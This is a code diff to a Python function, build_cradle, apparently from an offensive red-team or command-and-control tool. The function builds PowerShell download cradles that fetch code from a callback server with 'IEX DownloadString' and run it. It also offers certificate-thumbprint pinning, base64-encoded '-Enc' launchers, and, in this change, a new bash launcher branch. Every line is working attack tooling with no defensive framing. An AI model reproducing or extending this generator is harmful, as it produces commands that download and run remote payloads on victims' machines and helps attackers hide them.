@@ -121,7 +121,7 @@ def build_cradle(get_args, flavor="hub"):
         elif get_args['RadioFingerprint'] == 'true':
             result += ("[System.Net.ServicePointManager]::ServerCertificate"
                        "ValidationCallback={param($1,$2);"
-                       "$2.Thumbprint -eq \"%s\"};" %
+                       "$2.Thumbprint -eq '%s'};" %
                        FINGERPRINT.replace(':', ''))
         elif get_args['RadioCertStore'] == 'true':
             pass
@@ -139,7 +139,7 @@ def build_cradle(get_args, flavor="hub"):
             clip_exec = "&c=%s" % get_args['GroupClipExec']
         else:
             clip_exec = ""
-        result += "IEX $K.DownloadString(\"%s0?t=%s&f=%s&a=%s%s\");"
+        result += "IEX $K.DownloadString('%s0?t=%s&f=%s&a=%s%s');"
         result = result % (
             callback_urls[get_args['GroupTransport']],
             get_args['GroupTransport'],
@@ -149,10 +149,11 @@ def build_cradle(get_args, flavor="hub"):
         )
 
     if get_args['GroupLauncher'] == 'cmd':
-        result = result.replace('"', '\\"')
         result = 'powershell.exe "%s"' % result
     elif get_args['GroupLauncher'] == 'cmd_enc':
         result = 'powershell.exe -Enc %s' % \
             binascii.b2a_base64(result.encode('utf-16le')).decode()
-
+    elif get_args['GroupLauncher'] == 'bash':
+        result = result.replace('$', '\\$')
+        result = '"powershell.exe \\\"%s\\\""' % result
     return result
